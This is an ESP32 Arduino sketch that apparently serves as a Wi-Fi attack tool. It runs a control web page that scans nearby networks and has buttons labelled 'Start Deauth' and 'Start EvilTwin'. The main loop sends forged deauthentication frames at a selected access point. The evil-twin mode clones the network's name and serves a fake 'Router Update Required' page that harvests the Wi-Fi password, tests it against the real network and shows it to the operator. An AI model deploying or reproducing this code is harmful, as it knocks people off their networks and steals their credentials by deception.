#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <esp_wifi.h>

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

const byte DNS_PORT = 53;
DNSServer dnsServer;
WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += "0";
    str += String(b[i], HEX);
    if (i < size - 1) str += ":";
  }
  return str;
}

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _networks[i] = _Network();
  }
}

String _correct = "";
String _tryPassword = "";
bool hotspot_active = false;
bool deauthing_active = false;

void handleResult() {
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<html><head><script>setTimeout(function(){window.location.href = '/';}, 3000);</script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Wrong Password</h2><p>Please, try again.</p></body></html>");
  } else {
    webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Good password</h2></body></html>");
    hotspot_active = false;
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP("GMpro", "Sangkur87");
    dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
    _correct = "Got password for: " + _selectedNetwork.ssid + " Pass: " + _tryPassword;
  }
}

String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<style>.content {max-width: 500px;margin: auto;}table, th, td {border: 1px solid black;border-collapse: collapse;padding:5px;}</style>"
                   "</head><body><div class='content'>"
                   "<div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
                   "<button {disabled}>{deauth_button}</button></form>"
                   "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
                   "<button {disabled}>{hotspot_button}</button></form>"
                   "</div></br><table><tr><th>SSID</th><th>BSSID</th><th>Ch</th><th>Select</th></tr>";

void handleIndex() {
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    deauthing_active = (webServer.arg("deauth") == "start");
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;
      dnsServer.stop();
      WiFi.softAPdisconnect(true);
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
    } else {
      hotspot_active = false;
      dnsServer.stop();
      WiFi.softAPdisconnect(true);
      WiFi.softAP("GMpro", "Sangkur87");
      dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  if (!hotspot_active) {
    String _html = _tempHTML;
    for (int i = 0; i < 16; ++i) {
      if (_networks[i].ssid == "") break;
      String bssidStr = bytesToStr(_networks[i].bssid, 6);
      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bssidStr + "</td><td>" + String(_networks[i].ch) + "</td>";
      _html += "<td><form method='post' action='/?ap=" + bssidStr + "'><button>Select</button></form></td></tr>";
    }
    _html.replace("{deauth_button}", deauthing_active ? "Stop Deauth" : "Start Deauth");
    _html.replace("{deauth}", deauthing_active ? "stop" : "start");
    _html.replace("{hotspot_button}", "Start EvilTwin");
    _html.replace("{hotspot}", "start");
    _html.replace("{disabled}", (_selectedNetwork.ssid == "") ? "disabled" : "");
    if (_correct != "") _html += "<h3>" + _correct + "</h3>";
    _html += "</table></div></body></html>";
    webServer.send(200, "text/html", _html);
  } else {
    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str());
      webServer.send(200, "text/html", "<html><script>setTimeout(function(){window.location.href='/result';},15000);</script><body><h2>Updating...</h2></body></html>");
    } else {
      webServer.send(200, "text/html", "<html><body><h2>Router '" + _selectedNetwork.ssid + "' Update Required</h2><form action='/'><input type='text' name='password' minlength='8'><input type='submit' value='Submit'></form></body></html>");
    }
  }
}

void handleAdmin() { handleIndex(); }

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _networks[i].ssid = WiFi.SSID(i);
      _networks[i].ch = WiFi.channel(i);
      memcpy(_networks[i].bssid, WiFi.BSSID(i), 6);
    }
  }
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  esp_wifi_set_promiscuous(true); 
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP("GMpro", "Sangkur87");
  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();
}

unsigned long now = 0;
unsigned long deauth_now = 0;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  if (deauthing_active && millis() - deauth_now >= 100) {
    esp_wifi_set_channel(_selectedNetwork.ch, WIFI_SECOND_CHAN_NONE);
    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00};
    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    for(int i=0; i<5; i++) esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    deauth_now = millis();
  }
  if (millis() - now >= 15000) { performScan(); now = millis(); }
}
